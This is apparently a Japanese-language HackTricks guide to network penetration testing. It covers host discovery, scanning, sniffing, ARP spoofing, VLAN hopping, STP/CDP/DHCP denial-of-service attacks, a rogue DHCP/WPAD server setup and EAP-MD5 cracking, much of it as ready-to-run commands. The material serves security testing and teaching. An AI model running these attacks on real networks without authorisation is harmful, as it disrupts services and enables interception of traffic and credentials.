# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Discovering hosts from the outside

これは、**インターネット**から**応答しているIP**を見つける方法についての**簡単なセクション**です。\
この状況では、いくつかの**IPの範囲**（場合によっては複数の**範囲**）があり、**どのIPが応答しているか**を見つける必要があります。

### ICMP

これは、ホストが稼働しているかどうかを発見するための**最も簡単**で**最速**の方法です。\
いくつかの**ICMP**パケットを送信し、**応答を期待**することができます。最も簡単な方法は、**エコーリクエスト**を送信し、応答を期待することです。これを単純な`ping`を使用するか、**範囲**のために`fping`を使用して行うことができます。\
また、**nmap**を使用して他のタイプのICMPパケットを送信することもできます（これにより、一般的なICMPエコーリクエスト-応答のフィルターを回避できます）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCPポート発見

あらゆる種類のICMPパケットがフィルタリングされていることが非常に一般的です。そのため、ホストが稼働しているかどうかを確認するためにできることは、**オープンポートを見つけること**だけです。各ホストには**65535ポート**があるため、もし「大きな」スコープがある場合、各ホストの**各ポート**がオープンかどうかをテストすることは**できません**。それにはあまりにも時間がかかります。\
そのため、必要なのは**高速ポートスキャナー**（[masscan](https://github.com/robertdavidgraham/masscan)）と、**最も使用されるポートのリスト**です：
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
`nmap`を使ってこのステップを実行することもできますが、遅く、`nmap`はホストの識別に問題があります。

### HTTPポート発見

これは、**HTTP** **サービス**の発見に焦点を当てたいときに便利なTCPポート発見です：
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPポート発見

いくつかの**UDPポートが開いている**かどうかを確認して、**ホストにもっと注意を払う**べきかを判断することもできます。UDPサービスは通常、通常の空のUDPプローブパケットに**データ**で**応答しない**ため、ポートがフィルタリングされているのか開いているのかを判断するのは難しいです。これを判断する最も簡単な方法は、実行中のサービスに関連するパケットを送信することであり、どのサービスが実行されているかわからないため、ポート番号に基づいて最も可能性の高いものを試すべきです：
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
提案されたnmapのコマンドは、**/24**範囲内のすべてのホストで**上位1000のUDPポート**をテストしますが、これだけでも**>20分**かかります。**最速の結果**が必要な場合は、[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)を使用できます：`./udp-proto-scanner.pl 199.66.11.53/24` これにより、これらの**UDPプローブ**が**予想されるポート**に送信されます（/24範囲の場合、これにはわずか1分かかります）：_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTPポートディスカバリー
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifiのペンテスト

ここでは、執筆時点でのよく知られたWifi攻撃のガイドを見つけることができます：

{{#ref}}
../pentesting-wifi/
{{#endref}}

## 内部からホストを発見する

ネットワーク内にいる場合、最初に行いたいことの一つは**他のホストを発見する**ことです。**どれだけのノイズ**を出すことができるか/出したいかによって、異なるアクションを実行できます：

### パッシブ

接続されたネットワーク内でホストをパッシブに発見するために、これらのツールを使用できます：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### アクティブ

[_**外部からホストを発見する**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP ポート発見_) でコメントされた技術は、ここでも**適用可能**です。\
しかし、他のホストと**同じネットワーク**にいるため、**より多くのこと**ができます：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

外部からホストを発見する際にコメントされた技術（[_**ICMP**_](./#icmp)）は、ここでも**適用可能**です。\
しかし、他のホストと**同じネットワーク**にいるため、**より多くのこと**ができます：

- **サブネットブロードキャストアドレス**に**ping**を送信すると、pingは**各ホスト**に到達し、彼らは**あなたに応答**する可能性があります： `ping -b 10.10.5.255`
- **ネットワークブロードキャストアドレス**にpingを送信すると、**他のサブネット**内のホストを見つけることもできます： `ping -b 255.255.255.255`
- `nmap`の`-PE`、`-PP`、`-PM`フラグを使用して、**ICMPv4エコー**、**タイムスタンプ**、および**サブネットマスクリクエスト**をそれぞれ送信しながらホスト発見を行います： `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lanは、**ネットワークメッセージ**を通じてコンピュータを**起動する**ために使用されます。コンピュータを起動するために使用されるマジックパケットは、**MAC Dst**が提供され、その後同じパケット内で**16回繰り返される**だけのパケットです。\
この種のパケットは通常、**ethernet 0x0842**または**ポート9へのUDPパケット**で送信されます。\
**[MAC]**が提供されない場合、パケットは**ブロードキャストイーサネット**に送信され（ブロードキャストMACが繰り返されるものになります）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## ホストのスキャン

深くスキャンしたいすべてのIP（外部または内部）を発見したら、さまざまなアクションを実行できます。

### TCP

- **オープン**ポート: _SYN --> SYN/ACK --> RST_
- **クローズド**ポート: _SYN --> RST/ACK_
- **フィルタリングされた**ポート: _SYN --> \[NO RESPONSE]_
- **フィルタリングされた**ポート: _SYN --> ICMPメッセージ_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDPポートをスキャンするための2つのオプションがあります：

- **UDPパケット**を送信し、ポートが**閉じている**場合は_**ICMP到達不能**_の応答を確認します（いくつかのケースではICMPが**フィルタリング**されるため、ポートが閉じているか開いているかの情報は受け取れません）。
- **サービス**からの応答を引き出すために**フォーマットされたデータグラム**を送信します（例：DNS、DHCP、TFTPなど、_nmap-payloads_にリストされています）。**応答**を受け取った場合、ポートは**開いています**。

**Nmap**は"-sV"を使用して両方のオプションを**混合**します（UDPスキャンは非常に遅いですが）、UDPスキャンはTCPスキャンよりも遅いことに注意してください：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTPスキャン

**SCTP (ストリーム制御伝送プロトコル)** は、**TCP (伝送制御プロトコル)** と **UDP (ユーザーデータグラムプロトコル)** と一緒に使用されるように設計されています。その主な目的は、IPネットワーク上での電話データの輸送を促進することであり、**SS7 (信号システム7)** に見られる多くの信頼性機能を反映しています。**SCTP** は、SS7信号をIPネットワーク上で輸送することを目的とした**SIGTRAN**プロトコルファミリーのコアコンポーネントです。

**SCTP** のサポートは、**IBM AIX**、**Oracle Solaris**、**HP-UX**、**Linux**、**Cisco IOS**、および **VxWorks** などのさまざまなオペレーティングシステムによって提供されており、通信およびネットワーキングの分野での広範な受け入れと有用性を示しています。

nmapによって提供されるSCTPの2つの異なるスキャンは、_-sY_ と _-sZ_ です。
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDSとIPSの回避

{{#ref}}
ids-evasion.md
{{#endref}}

### **より多くのnmapオプション**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 内部IPアドレスの明示

**誤設定されたルーター、ファイアウォール、ネットワークデバイス**は、**非公開のソースアドレス**を使用してネットワークプローブに応答することがあります。**tcpdump**を利用して、テスト中にプライベートアドレスから受信したパケットを特定できます。具体的には、Kali Linux上で、**eth2インターフェース**でパケットをキャプチャできます。セットアップがNATまたはファイアウォールの背後にある場合、そのようなパケットはフィルタリングされる可能性が高いことに注意が必要です。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## スニッフィング

スニッフィングを使用すると、キャプチャされたフレームやパケットをレビューすることで、IP範囲、サブネットサイズ、MACアドレス、およびホスト名の詳細を学ぶことができます。ネットワークが誤って構成されている場合やスイッチングファブリックがストレス下にある場合、攻撃者はパッシブネットワークスニッフィングを通じて機密情報をキャプチャすることができます。

スイッチされたイーサネットネットワークが適切に構成されている場合、ブロードキャストフレームとあなたのMACアドレス宛てのデータのみが表示されます。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
リモートマシンからSSHセッションを介してWiresharkをGUIとして使用し、リアルタイムでパケットをキャプチャすることもできます。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### ベターキャップ
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

明らかに。

### 認証情報のキャプチャ

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) のようなツールを使用して、pcapまたはライブインターフェースから認証情報を解析できます。

## LAN攻撃

### ARPスプーフィング

ARPスプーフィングは、マシンのIPが私たちのデバイスのMACであることを示すために、無償のARPレスポンスを送信することです。これにより、被害者はARPテーブルを変更し、スプーフィングされたIPに接続したいときに私たちのマシンに連絡します。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAMオーバーフロー

スイッチのCAMテーブルをオーバーフローさせるために、異なるソースMACアドレスを持つ多数のパケットを送信します。CAMテーブルが満杯になると、スイッチはハブのように動作し始め（すべてのトラフィックをブロードキャストします）。
```bash
macof -i <interface>
```
現代のスイッチでは、この脆弱性は修正されています。

### 802.1Q VLAN / DTP 攻撃

#### ダイナミックトランク

**Dynamic Trunking Protocol (DTP)** は、トランクの自動システムを促進するために設計されたリンク層プロトコルであり、スイッチがトランクモード（Trunk）または非トランクモードのポートを自動的に選択できるようにします。**DTP** の展開は、しばしば最適でないネットワーク設計の指標と見なされ、必要な場合にのみトランクを手動で構成し、適切な文書化を確保することの重要性を強調します。

デフォルトでは、スイッチポートはダイナミックオートモードで動作するように設定されており、隣接するスイッチからの要求があればトランクを開始する準備が整っています。セキュリティ上の懸念は、ペンテスターまたは攻撃者がスイッチに接続し、DTP Desirable フレームを送信してポートをトランクモードに強制する場合に生じます。このアクションにより、攻撃者はSTPフレーム分析を通じてVLANを列挙し、仮想インターフェースを設定することでVLANセグメンテーションを回避できます。

多くのスイッチにデフォルトでDTPが存在することは、敵がスイッチの動作を模倣し、すべてのVLANのトラフィックにアクセスすることを可能にします。スクリプト [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) はインターフェースを監視するために使用され、スイッチがデフォルト、トランク、ダイナミック、オート、またはアクセスポートモードのいずれにあるかを明らかにします。アクセスポートモードのみがVLANホッピング攻撃に対して免疫を持つ構成です。このツールはスイッチの脆弱性状態を評価します。

ネットワークの脆弱性が特定された場合、_**Yersinia**_ ツールを使用してDTPプロトコルを介して「トランクを有効にする」ことができ、すべてのVLANからのパケットを観察することが可能になります。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLANを列挙するために、スクリプト[**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**を使用してDTP Desirableフレームを生成することも可能です。**いかなる状況でもスクリプトを中断しないでください。3秒ごとにDTP Desirableを注入します。** **スイッチ上で動的に作成されたトランクチャネルは5分間のみ存在します。5分後、トランクは切断されます。**
```
sudo python3 DTPHijacking.py --interface eth0
```
**Access/Desirable (0x03)**は、DTPフレームがDesirableタイプであることを示し、ポートにTrunkモードに切り替えるよう指示します。また、**802.1Q/802.1Q (0xa5)**は、**802.1Q**カプセル化タイプを示します。

STPフレームを分析することで、**VLAN 30とVLAN 60の存在について学びます。**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 特定のVLANへの攻撃

VLAN IDとIP値がわかれば、**特定のVLANを攻撃するために仮想インターフェースを設定できます**。\
DHCPが利用できない場合は、_ifconfig_を使用して静的IPアドレスを設定します。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自動VLANホッパー

**ダイナミックトランキングと仮想インターフェースを作成し、他のVLAN内のホストを発見する**という攻撃は、ツールによって**自動的に実行されます**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### ダブルタグ付け

攻撃者が**被害者ホストのMAC、IP、およびVLAN IDの値**を知っている場合、彼は**フレームにダブルタグを付ける**ことを試み、その指定されたVLANと被害者のVLANを使用してパケットを送信することができます。**被害者は攻撃者に接続できないため、攻撃者にとって最良の選択肢はUDPを介して通信することです**。これにより、いくつかの興味深いアクションを実行できるプロトコル（SNMPなど）と通信できます。

攻撃者の別のオプションは、**攻撃者が制御し、被害者がアクセスできるIPを偽装してTCPポートスキャンを実行することです**（おそらくインターネットを介して）。その後、攻撃者は、被害者からのパケットを受信した場合、彼が所有する2番目のホストでスニッフィングを行うことができます。

![](<../../images/image (190).png>)

この攻撃を実行するには、scapyを使用できます: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

もし**直接接続されているスイッチにアクセスできる**場合、ネットワーク内で**VLANセグメンテーションをバイパスする**能力があります。単に**ポートをトランクモードに切り替え**（トランクとも呼ばれます）、ターゲットVLANのIDを持つ仮想インターフェースを作成し、IPアドレスを設定します。アドレスを動的に要求する（DHCP）か、静的に設定することができます。ケースによります。

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

ゲスト無線ネットワークなどの特定の環境では、**ポートアイソレーション（プライベートVLANとも呼ばれる）**設定が実装され、無線アクセスポイントに接続されたクライアント同士が直接通信するのを防ぎます。しかし、これらのアイソレーション対策を回避できる技術が特定されています。この技術は、ネットワークACLの欠如または不適切な構成を利用し、IPパケットがルーターを通じて同じネットワーク上の別のクライアントにルーティングされることを可能にします。

攻撃は、**宛先クライアントのIPアドレスを持つパケットを作成し、ルーターのMACアドレスを使用する**ことによって実行されます。これにより、ルーターはパケットを誤ってターゲットクライアントに転送します。このアプローチは、被害者にアクセス可能なホストを制御する能力を利用してセキュリティの欠陥を悪用するダブルタグ攻撃で使用されるものに似ています。

**攻撃の主要なステップ:**

1. **パケットの作成:** ターゲットクライアントのIPアドレスを含むように特別に作成されたパケット。
2. **ルーターの動作を悪用:** 作成されたパケットがルーターに送信され、構成によりパケットがターゲットクライアントにリダイレクトされ、プライベートVLAN設定によるアイソレーションをバイパスします。

### VTP Attacks

VTP（VLANトランクプロトコル）はVLAN管理を集中化します。VLANデータベースの整合性を維持するためにリビジョン番号を利用し、変更があるとこの番号が増加します。スイッチは、より高いリビジョン番号の構成を採用し、自身のVLANデータベースを更新します。

#### VTP Domain Roles

- **VTPサーバー:** VLANを管理—作成、削除、変更します。ドメインメンバーにVTPアナウンスをブロードキャストします。
- **VTPクライアント:** VTPアナウンスを受信し、自身のVLANデータベースを同期します。この役割はローカルVLAN構成の変更が制限されています。
- **VTPトランスペアレント:** VTP更新に関与せず、VTPアナウンスを転送します。VTP攻撃の影響を受けず、リビジョン番号は常にゼロのままです。

#### VTP Advertisement Types

- **サマリーアナウンス:** VTPサーバーによって300秒ごとにブロードキャストされ、重要なドメイン情報を含みます。
- **サブセットアナウンス:** VLAN構成変更後に送信されます。
- **アナウンスリクエスト:** VTPクライアントによってサマリーアナウンスを要求するために発行され、通常はより高い構成リビジョン番号を検出した際に行われます。

VTPの脆弱性は、VTPアナウンスがトランクポートを通じてのみ循環するため、トランクポートを介してのみ悪用可能です。DTP攻撃後のシナリオはVTPに移行する可能性があります。Yersiniaのようなツールは、VLANデータベースを消去し、ネットワークを効果的に混乱させることを目的としたVTP攻撃を支援できます。

注意: この議論はVTPバージョン1（VTPv1）に関するものです。
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Yersiniaのグラフィカルモードで、VLANデータベースを削除するためにすべてのVTP VLANを削除するオプションを選択します。

### STP攻撃

**インターフェースでBPDUフレームをキャプチャできない場合、STP攻撃に成功する可能性は低いです。**

#### **STP BPDU DoS**

多くのBPDUs TCP（トポロジ変更通知）やConf（トポロジが作成されるときに送信されるBPDU）を送信すると、スイッチが過負荷になり、正しく動作しなくなります。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP攻撃**

TCPが送信されると、スイッチのCAMテーブルは15秒で削除されます。その後、この種のパケットを継続的に送信していると、CAMテーブルは継続的に（または15秒ごとに）再起動され、再起動されるとスイッチはハブのように動作します。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STPルート攻撃**

攻撃者はスイッチの動作をシミュレートして、ネットワークのSTPルートになります。これにより、より多くのデータが彼を通過します。これは、2つの異なるスイッチに接続されているときに興味深いです。\
これは、実際のルートスイッチの実際の優先度よりも**優先度**値が低いと伝えるBPDUs CONFパケットを送信することによって行われます。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**攻撃者が2つのスイッチに接続されている場合、彼は新しいツリーのルートになり、これらのスイッチ間のすべてのトラフィックが彼を通過します**（MITM攻撃が実行されます）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP攻撃

CISCO Discovery Protocol (CDP)は、CISCOデバイス間の通信に不可欠であり、**互いを識別し、設定の詳細を共有する**ことを可能にします。

#### パッシブデータ収集 <a href="#id-0e0f" id="id-0e0f"></a>

CDPはすべてのポートを通じて情報をブロードキャストするように設定されており、これがセキュリティリスクにつながる可能性があります。攻撃者はスイッチポートに接続すると、**Wireshark**、**tcpdump**、または**Yersinia**のようなネットワークスニファーを展開することができます。この行動は、ネットワークデバイスに関する機密データ、モデルや実行中のCisco IOSのバージョンを明らかにする可能性があります。攻撃者は、特定のCisco IOSバージョンの脆弱性をターゲットにするかもしれません。

#### CDPテーブルフラッディングの誘発 <a href="#id-0d6a" id="id-0d6a"></a>

より攻撃的なアプローチは、正当なCISCOデバイスを装ってスイッチのメモリを圧倒することによってサービス拒否（DoS）攻撃を開始することです。以下は、テスト用に設計されたネットワークツールYersiniaを使用してそのような攻撃を開始するためのコマンドシーケンスです：
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
この攻撃中、スイッチのCPUとCDP隣接テーブルは大きな負担を受け、過剰なリソース消費によりしばしば**「ネットワーク麻痺」**と呼ばれる状態になります。

#### CDPなりすまし攻撃
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
[**scapy**](https://github.com/secdev/scapy/)を使用することもできます。`scapy/contrib`パッケージをインストールすることを忘れないでください。

### VoIP攻撃とVoIP Hopperツール

VoIP電話は、IoTデバイスとますます統合されており、特別な電話番号を通じてドアの解錠やサーモスタットの制御などの機能を提供します。しかし、この統合はセキュリティリスクをもたらす可能性があります。

ツール[**voiphopper**](http://voiphopper.sourceforge.net)は、さまざまな環境（Cisco、Avaya、Nortel、Alcatel-Lucent）でVoIP電話をエミュレートするように設計されています。CDP、DHCP、LLDP-MED、802.1Q ARPなどのプロトコルを使用して、音声ネットワークのVLAN IDを発見します。

**VoIP Hopper**は、Cisco Discovery Protocol（CDP）用に3つのモードを提供します：

1. **スニフモード**（`-c 0`）：ネットワークパケットを分析してVLAN IDを特定します。
2. **スプーフモード**（`-c 1`）：実際のVoIPデバイスのパケットを模倣したカスタムパケットを生成します。
3. **事前作成パケットモード**（`-c 2`）：特定のCisco IP電話モデルのパケットと同一のパケットを送信します。

速度のために推奨されるモードは3番目です。次のことを指定する必要があります：

- 攻撃者のネットワークインターフェース（`-i`パラメータ）。
- エミュレートされるVoIPデバイスの名前（`-E`パラメータ）、Ciscoの命名形式に従うこと（例：SEPの後にMACアドレス）。

企業環境では、既存のVoIPデバイスを模倣するために、次のことを行うことがあります：

- 電話のMACラベルを確認する。
- 電話のディスプレイ設定をナビゲートしてモデル情報を表示する。
- VoIPデバイスをラップトップに接続し、Wiresharkを使用してCDPリクエストを観察する。

ツールを3番目のモードで実行するためのコマンドの例は次のとおりです：
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP攻撃

#### 列挙
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoSの2種類**は、DHCPサーバーに対して実行できます。最初のものは、**すべての可能なIPアドレスを使用するために十分な偽のホストをシミュレートする**ことです。\
この攻撃は、DHCPサーバーの応答を確認し、プロトコルを完了できる場合にのみ機能します（**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)）。例えば、これは**Wifiネットワークでは不可能です**。

DHCP DoSを実行する別の方法は、**すべての可能なIPをソースコードとして使用してDHCP-RELEASEパケットを送信する**ことです。そうすると、サーバーは誰もIPの使用を終えたと考えます。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
より自動的にこれを行う方法は、ツール [DHCPing](https://github.com/kamorin/DHCPig) を使用することです。

前述のDoS攻撃を使用して、クライアントが環境内で新しいリースを取得するよう強制し、正当なサーバーを枯渇させて応答しなくすることができます。したがって、正当なサーバーが再接続しようとすると、**次の攻撃で言及されている悪意のある値を提供できます**。

#### 悪意のある値を設定する

不正なDHCPサーバーは、`/usr/share/responder/DHCP.py`にあるDHCPスクリプトを使用して設定できます。これは、トラフィックを悪意のあるサーバーにリダイレクトすることによって、HTTPトラフィックや認証情報をキャプチャするためのネットワーク攻撃に役立ちます。ただし、不正なゲートウェイを設定することはあまり効果的ではなく、クライアントからのアウトバウンドトラフィックのみをキャプチャし、実際のゲートウェイからの応答を見逃すことになります。代わりに、不正なDNSまたはWPADサーバーを設定することが、より効果的な攻撃のために推奨されます。

以下は、不正なDHCPサーバーを構成するためのコマンドオプションです：

- **私たちのIPアドレス（ゲートウェイ広告）**: `-i 10.0.0.100`を使用して、あなたのマシンのIPをゲートウェイとして広告します。
- **ローカルDNSドメイン名**: 必要に応じて、`-d example.org`を使用してローカルDNSドメイン名を設定します。
- **元のルーター/ゲートウェイIP**: `-r 10.0.0.1`を使用して、正当なルーターまたはゲートウェイのIPアドレスを指定します。
- **プライマリDNSサーバーIP**: `-p 10.0.0.100`を使用して、あなたが制御する不正なDNSサーバーのIPアドレスを設定します。
- **セカンダリDNSサーバーIP**: 必要に応じて、`-s 10.0.0.1`を使用してセカンダリDNSサーバーのIPを設定します。
- **ローカルネットワークのネットマスク**: `-n 255.255.255.0`を使用して、ローカルネットワークのネットマスクを定義します。
- **DHCPトラフィック用インターフェース**: `-I eth1`を使用して、特定のネットワークインターフェースでDHCPトラフィックをリッスンします。
- **WPAD構成アドレス**: `-w “http://10.0.0.100/wpad.dat”`を使用して、ウェブトラフィックの傍受を支援するWPAD構成のアドレスを設定します。
- **デフォルトゲートウェイIPを偽装**: `-S`を含めて、デフォルトゲートウェイのIPアドレスを偽装します。
- **すべてのDHCPリクエストに応答**: `-R`を含めて、サーバーがすべてのDHCPリクエストに応答するようにしますが、これはノイジーで検出される可能性があることに注意してください。

これらのオプションを正しく使用することで、不正なDHCPサーバーを効果的に設立し、ネットワークトラフィックを傍受することができます。
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP攻撃**

802.1X実装に対して使用できる攻撃戦術のいくつかは次のとおりです：

- EAPを介したアクティブなブルートフォースパスワードグラインディング
- 形式が不正なEAPコンテンツを使用してRADIUSサーバーを攻撃する _\*\*_(エクスプロイト)
- EAPメッセージのキャプチャとオフラインパスワードクラッキング（EAP-MD5およびPEAP）
- TLS証明書検証をバイパスするためにEAP-MD5認証を強制する
- ハブまたは類似のものを使用して認証時に悪意のあるネットワークトラフィックを注入する

攻撃者が被害者と認証サーバーの間にいる場合、必要に応じて認証プロトコルをEAP-MD5にダウングレードし、認証試行をキャプチャしようとすることができます。その後、次の方法でブルートフォース攻撃を行うことができます：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 攻撃 <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) は、**ホット冗長ルーティングシステムを作成するために設計されたネットワークプロトコルのクラス**です。FHRPを使用すると、物理ルーターを単一の論理デバイスに統合でき、耐障害性が向上し、負荷の分散が助けられます。

